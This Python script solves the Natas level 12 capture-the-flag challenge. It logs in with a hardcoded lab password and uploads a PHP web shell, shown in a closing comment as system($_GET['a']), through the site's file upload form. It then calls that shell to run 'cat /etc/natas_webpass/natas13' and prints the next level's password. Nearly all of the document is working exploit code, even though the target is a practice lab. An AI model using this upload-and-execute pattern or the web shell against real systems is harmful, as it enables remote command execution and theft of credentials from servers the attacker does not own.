from pwn import *
import requests
import re

username = "natas12"
password = "EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3"
url = "http://{}.natas.labs.overthewire.org".format(username)

log.progress("Getting the natas13 password, Hold on! ")
session = requests.session()
upload = session.post(url  , files = {"uploadedfile": open('C:\\test\\revshell.php','rb')}, data = {"filename" : "revshell.php", "MAX_FILE_SIZE" : "1000" },  auth = (username, password)).text
content = re.findall('(.*)>upload', upload)
location = re.findall('upload/(.*)"', str(content))
filename = location[0]
web = session.get(url + "/upload/{}?a=cat /etc/natas_webpass/natas13".format(filename) , auth = (username, password)).text
print("The password for natas13 is === " + re.findall("[A-Za-z0-9]{32}", web)[0])



'''

REVSHELL COMMAND IS 

<?php

	system($_GET['a']);

?>

'''